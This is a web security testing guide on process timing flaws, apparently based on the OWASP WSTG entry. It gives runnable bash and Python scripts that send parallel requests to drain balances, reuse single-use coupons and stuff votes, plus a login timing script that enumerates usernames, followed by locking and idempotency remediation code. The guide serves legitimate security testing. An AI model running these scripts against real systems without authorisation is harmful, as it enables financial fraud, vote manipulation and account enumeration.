# WSTG-BUSL-04: Test for Process Timing

## Test ID
WSTG-BUSL-04

## Test Name
Test for Process Timing

## High-Level Description

Process timing testing examines whether an application's business logic can be exploited through timing attacks or race conditions. Attackers may exploit timing vulnerabilities to bypass security controls, perform double-spending attacks, or gain unauthorized access. This includes testing for race conditions in financial transactions, time-of-check to time-of-use (TOCTOU) vulnerabilities, and timing-based information leakage.

---

## What to Check

### Timing Vulnerabilities

- [ ] Race conditions in transactions
- [ ] Double-spending attacks
- [ ] Time-of-check time-of-use (TOCTOU)
- [ ] Parallel request exploitation
- [ ] Timing-based enumeration
- [ ] Session timing issues

### Vulnerable Operations

| Operation | Risk |
|-----------|------|
| Financial transfers | Double spending |
| Coupon/code redemption | Multiple use |
| Vote/rating systems | Vote manipulation |
| Inventory reservation | Overbooking |
| Account creation | Duplicate accounts |

---

## How to Test

### Step 1: Identify Race Condition Targets

```bash
# Operations susceptible to race conditions:
# - Balance checks before transfers
# - Stock checks before purchases
# - Coupon validation before application
# - Vote counting
# - Rate limiting checks

# Document the target endpoints
echo "Identified targets:
- POST /api/transfer
- POST /api/apply-coupon
- POST /api/vote
- POST /api/purchase"
```

### Step 2: Test Parallel Request Race Condition

```bash
#!/bin/bash
# Race condition test - send multiple requests simultaneously

TARGET="https://target.com/api/transfer"
TOKEN="your_auth_token"
CONCURRENT=10

# Create the request payload
PAYLOAD='{"from":"account1","to":"account2","amount":100}'

# Function to send request
send_request() {
    curl -s -X POST "$TARGET" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d "$PAYLOAD" \
        -w "\n%{http_code}" &
}

echo "Sending $CONCURRENT concurrent requests..."

# Send all requests at once
for i in $(seq 1 $CONCURRENT); do
    send_request
done

# Wait for all to complete
wait

echo "Check account balances for race condition success"
```

### Step 3: Test Double-Spending Attack

```python
#!/usr/bin/env python3
import requests
import threading
import time

class DoubleSpendTester:
    def __init__(self, url, token):
        self.url = url
        self.headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json"
        }
        self.results = []

    def send_transfer(self, thread_id):
        """Send transfer request"""
        try:
            response = requests.post(
                self.url,
                headers=self.headers,
                json={
                    "from": "account1",
                    "to": "account2",
                    "amount": 100  # Full balance
                }
            )
            self.results.append({
                "thread": thread_id,
                "status": response.status_code,
                "response": response.text
            })
        except Exception as e:
            self.results.append({
                "thread": thread_id,
                "error": str(e)
            })

    def test_double_spend(self, num_threads=10):
        """Launch parallel transfer attempts"""
        threads = []

        # Create all threads
        for i in range(num_threads):
            t = threading.Thread(target=self.send_transfer, args=(i,))
            threads.append(t)

        # Start all threads as simultaneously as possible
        for t in threads:
            t.start()

        # Wait for completion
        for t in threads:
            t.join()

        # Analyze results
        successful = [r for r in self.results if r.get("status") == 200]
        print(f"Successful transfers: {len(successful)} out of {num_threads}")

        if len(successful) > 1:
            print("[VULNERABLE] Multiple transfers succeeded!")
            print("Double-spending attack possible!")

        return self.results

# Usage
tester = DoubleSpendTester(
    "https://target.com/api/transfer",
    "auth_token"
)
results = tester.test_double_spend(20)
```

### Step 4: Test Coupon/Code Race Condition

```bash
#!/bin/bash
# Test single-use coupon race condition

COUPON_CODE="DISCOUNT50"
TARGET="https://target.com/api/apply-coupon"
TOKEN="your_token"

# Send 20 parallel requests
for i in {1..20}; do
    curl -s -X POST "$TARGET" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d "{\"code\": \"$COUPON_CODE\"}" \
        -o "response_$i.txt" &
done

wait

# Count successful applications
echo "Results:"
grep -l "success\|applied" response_*.txt | wc -l
echo "successful coupon applications"

# If more than 1, race condition exists
```

### Step 5: Test TOCTOU Vulnerability

```python
#!/usr/bin/env python3
import requests
import threading
import time

def toctou_test(base_url, token):
    """
    Test Time-of-Check to Time-of-Use
    Scenario: Check balance, then transfer
    """

    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    def drain_account():
        """Try to transfer all funds"""
        # This will be sent simultaneously
        requests.post(
            f"{base_url}/api/transfer",
            headers=headers,
            json={
                "to": "attacker_account",
                "amount": 1000  # Full balance
            }
        )

    # Send many parallel requests
    threads = []
    for _ in range(50):
        t = threading.Thread(target=drain_account)
        threads.append(t)

    # Start all at once
    for t in threads:
        t.start()

    for t in threads:
        t.join()

    # Check final balance
    balance_response = requests.get(
        f"{base_url}/api/account/balance",
        headers=headers
    )

    print(f"Final balance: {balance_response.json()}")
    # If negative balance, TOCTOU vulnerability exists

toctou_test("https://target.com", "auth_token")
```

### Step 6: Test Timing-Based Information Leakage

```bash
#!/bin/bash
# Measure response times to detect timing leaks

echo "Testing timing-based user enumeration..."

# Valid user
for i in {1..10}; do
    time=$(curl -s -o /dev/null -w "%{time_total}" \
        -X POST "https://target.com/login" \
        -d "username=admin&password=wrongpassword")
    echo "Valid user: $time"
done

echo ""

# Invalid user
for i in {1..10}; do
    time=$(curl -s -o /dev/null -w "%{time_total}" \
        -X POST "https://target.com/login" \
        -d "username=nonexistent12345&password=wrongpassword")
    echo "Invalid user: $time"
done

# Compare averages - significant difference indicates timing leak
```

### Step 7: Test Vote/Rating Race Condition

```python
#!/usr/bin/env python3
import requests
import threading
import asyncio
import aiohttp

async def vote_race_condition_test(url, token, item_id, num_votes=100):
    """Test if multiple votes can be cast simultaneously"""

    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    async def cast_vote(session, vote_num):
        try:
            async with session.post(
                url,
                headers=headers,
                json={"item_id": item_id, "vote": 1}
            ) as response:
                return {
                    "vote": vote_num,
                    "status": response.status,
                    "text": await response.text()
                }
        except Exception as e:
            return {"vote": vote_num, "error": str(e)}

    async with aiohttp.ClientSession() as session:
        tasks = [cast_vote(session, i) for i in range(num_votes)]
        results = await asyncio.gather(*tasks)

    successful = [r for r in results if r.get("status") == 200]
    print(f"Successful votes: {len(successful)} / {num_votes}")

    if len(successful) > 1:
        print("[VULNERABLE] Multiple votes accepted!")

    return results

# Run
asyncio.run(vote_race_condition_test(
    "https://target.com/api/vote",
    "auth_token",
    "item_123"
))
```

---

## Tools

### Race Condition Testing

| Tool | Description | Usage |
|------|-------------|-------|
| **Turbo Intruder** | Burp extension | Race condition testing |
| **Race The Web** | CLI tool | `race-the-web config.toml` |
| **asyncio/aiohttp** | Python async | Parallel requests |

### Timing Analysis

| Tool | Description |
|------|-------------|
| **Burp Suite** | Response time analysis |
| **curl** | `-w "%{time_total}"` |
| **Custom scripts** | Statistical analysis |

---

## Example Commands/Payloads

### Turbo Intruder Script

```python
# Turbo Intruder script for race conditions
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=30,
        requestsPerConnection=100,
        pipeline=False
    )

    # Queue the same request multiple times
    for i in range(30):
        engine.queue(target.req, target.baseInput)

def handleResponse(req, interesting):
    # Log all responses
    table.add(req)
```

### Race Condition Test with GNU Parallel

```bash
#!/bin/bash
# Using GNU parallel for race condition testing

# Create request script
cat > race_request.sh << 'EOF'
curl -s -X POST "https://target.com/api/transfer" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"to":"attacker","amount":100}' \
    -w "%{http_code}\n"
EOF

chmod +x race_request.sh

# Run 50 parallel instances
seq 50 | parallel -j50 ./race_request.sh

# Count successes
```

### Comprehensive Race Condition Tester

```python
#!/usr/bin/env python3
import asyncio
import aiohttp
import statistics
import time

class RaceConditionTester:
    def __init__(self, target_url, headers):
        self.url = target_url
        self.headers = headers
        self.results = []

    async def send_request(self, session, request_id, payload):
        """Send single request and record timing"""
        start = time.time()
        try:
            async with session.post(
                self.url,
                headers=self.headers,
                json=payload
            ) as response:
                elapsed = time.time() - start
                body = await response.text()
                return {
                    "id": request_id,
                    "status": response.status,
                    "time": elapsed,
                    "success": response.status == 200,
                    "body": body[:200]
                }
        except Exception as e:
            return {
                "id": request_id,
                "error": str(e),
                "time": time.time() - start
            }

    async def test_race_condition(self, payload, num_requests=50):
        """Test for race condition with parallel requests"""

        connector = aiohttp.TCPConnector(limit=0)  # No connection limit

        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = [
                self.send_request(session, i, payload)
                for i in range(num_requests)
            ]
            self.results = await asyncio.gather(*tasks)

        return self.analyze_results()

    def analyze_results(self):
        """Analyze race condition results"""
        successful = [r for r in self.results if r.get("success")]
        failed = [r for r in self.results if not r.get("success") and "status" in r]
        errors = [r for r in self.results if "error" in r]

        times = [r["time"] for r in self.results if "time" in r]

        analysis = {
            "total_requests": len(self.results),
            "successful": len(successful),
            "failed": len(failed),
            "errors": len(errors),
            "avg_time": statistics.mean(times) if times else 0,
            "time_stdev": statistics.stdev(times) if len(times) > 1 else 0,
            "vulnerable": len(successful) > 1  # If multiple succeed, potential race
        }

        if analysis["vulnerable"]:
            analysis["warning"] = "RACE CONDITION DETECTED!"

        return analysis

# Usage
async def main():
    tester = RaceConditionTester(
        "https://target.com/api/transfer",
        {
            "Authorization": "Bearer token",
            "Content-Type": "application/json"
        }
    )

    result = await tester.test_race_condition(
        {"to": "attacker", "amount": 100},
        num_requests=50
    )

    print(result)

asyncio.run(main())
```

---

## Remediation Guide

### 1. Implement Database-Level Locking

```python
from sqlalchemy import select, update
from sqlalchemy.orm import Session

def secure_transfer(from_account, to_account, amount):
    """Transfer with row-level locking"""

    with Session(engine) as session:
        # Lock the source account row for update
        source = session.execute(
            select(Account)
            .where(Account.id == from_account)
            .with_for_update()  # Row lock
        ).scalar_one()

        # Check balance after acquiring lock
        if source.balance < amount:
            raise InsufficientFundsError()

        # Perform transfer
        source.balance -= amount

        target = session.execute(
            select(Account)
            .where(Account.id == to_account)
            .with_for_update()
        ).scalar_one()

        target.balance += amount

        session.commit()
```

### 2. Use Optimistic Locking

```python
from sqlalchemy import Column, Integer
from sqlalchemy.orm import validates

class Account(Base):
    id = Column(Integer, primary_key=True)
    balance = Column(Integer)
    version = Column(Integer, default=0)  # Optimistic lock

def transfer_optimistic(from_id, to_id, amount):
    """Transfer with optimistic locking"""

    with Session(engine) as session:
        source = session.query(Account).get(from_id)
        original_version = source.version

        if source.balance < amount:
            raise InsufficientFundsError()

        # Update with version check
        result = session.execute(
            update(Account)
            .where(Account.id == from_id)
            .where(Account.version == original_version)
            .values(
                balance=Account.balance - amount,
                version=Account.version + 1
            )
        )

        if result.rowcount == 0:
            raise ConcurrentModificationError("Retry transaction")

        # Update target
        session.execute(
            update(Account)
            .where(Account.id == to_id)
            .values(balance=Account.balance + amount)
        )

        session.commit()
```

### 3. Atomic Operations with Redis

```python
import redis

redis_client = redis.Redis()

def atomic_coupon_redemption(user_id, coupon_code):
    """Atomically redeem single-use coupon"""

    # Use Redis SETNX for atomic check-and-set
    key = f"coupon:used:{coupon_code}"

    # SETNX returns True only if key didn't exist
    if redis_client.setnx(key, user_id):
        # Successfully claimed - coupon is now used
        redis_client.expire(key, 86400 * 30)  # Expire in 30 days

        # Apply discount
        apply_discount(user_id, coupon_code)
        return True
    else:
        # Coupon already used
        return False
```

### 4. Idempotency Keys

```python
import redis
import uuid

redis_client = redis.Redis()

def process_payment_idempotent(idempotency_key, payment_data):
    """Process payment with idempotency protection"""

    if not idempotency_key:
        raise ValueError("Idempotency key required")

    lock_key = f"payment:lock:{idempotency_key}"
    result_key = f"payment:result:{idempotency_key}"

    # Try to acquire lock
    if not redis_client.setnx(lock_key, "1"):
        # Request in progress or completed
        cached_result = redis_client.get(result_key)
        if cached_result:
            return json.loads(cached_result)
        else:
            raise ConcurrentRequestError("Request in progress")

    try:
        # Set lock expiration
        redis_client.expire(lock_key, 60)

        # Process payment
        result = process_payment(payment_data)

        # Cache result
        redis_client.setex(result_key, 86400, json.dumps(result))

        return result

    finally:
        # Release lock
        redis_client.delete(lock_key)
```

---

## Risk Assessment

### CVSS Score

| Finding | CVSS | Severity |
|---------|------|----------|
| Double-spending in financial transactions | 9.8 | Critical |
| Race condition bypassing business limits | 8.8 | High |
| TOCTOU in authorization checks | 8.8 | High |
| Multiple coupon redemption | 6.5 | Medium |
| Vote manipulation | 5.3 | Medium |

---

## CWE Categories

| CWE ID | Title | Description |
|--------|-------|-------------|
| **CWE-362** | Concurrent Execution Using Shared Resource | Race condition |
| **CWE-367** | Time-of-check Time-of-use (TOCTOU) | TOCTOU vulnerability |
| **CWE-208** | Observable Timing Discrepancy | Timing attacks |

---

## References

- [OWASP WSTG - Test for Process Timing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/04-Test_for_Process_Timing)
- [PortSwigger - Race Conditions](https://portswigger.net/web-security/race-conditions)
- [Turbo Intruder](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack)

---

## Checklist

```
[ ] Race condition targets identified
[ ] Parallel request testing performed
[ ] Double-spending attack tested
[ ] Coupon/code race condition tested
[ ] TOCTOU vulnerabilities tested
[ ] Vote/rating manipulation tested
[ ] Timing-based enumeration tested
[ ] Database locking reviewed
[ ] Idempotency implementation checked
[ ] Atomic operations verified
[ ] Findings documented
[ ] Remediation recommendations provided
```
